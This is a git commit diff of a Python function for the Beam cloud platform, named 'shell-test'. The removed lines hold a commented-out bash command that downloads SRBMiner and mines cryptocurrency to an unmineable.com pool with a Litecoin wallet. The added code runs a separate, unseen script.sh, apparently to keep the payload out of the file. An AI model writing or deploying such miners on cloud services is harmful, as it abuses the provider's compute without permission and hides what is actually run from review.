f258483e7542b32c29ad4cb26a9713e0b5382d3d
manja-ysm-aelli <ysm.aelli.ga.ya@gmail.com>
2026-08-14 01:22:15 +0700

    Update mui.py

--- mui.py
+++ mui.py
@@ -1,32 +1,14 @@
 from beam import function
 import subprocess
+from pathlib import Path
 
 @function(name="shell-test")
 def momo():
-    result = subprocess.run(
-        ["bash", "-lc", """
-            echo "=== MULAI ==="
-            pwd
-            hostname
-            ls -la
+    script = Path(__file__).parent / "script.sh"
 
-            # =========================
-            # wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz && cd SRBMiner-Multi-2-4-8 && ./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."test$RANDOM"
-            # =========================
+    print("Mencari:", script)
+    print("Ada:", script.exists())
 
-            echo "=== SELESAI ==="
-        """],
-        capture_output=True,
-        text=True,
-        check=True,
-    )
+    subprocess.run(["bash", str(script)], check=True)
 
-    print(result.stdout)
-
-    if result.stderr:
-        print(result.stderr)
-
-    return {
-        "status": "success",
-        "output": result.stdout,
-    }
+    return "Selesai"
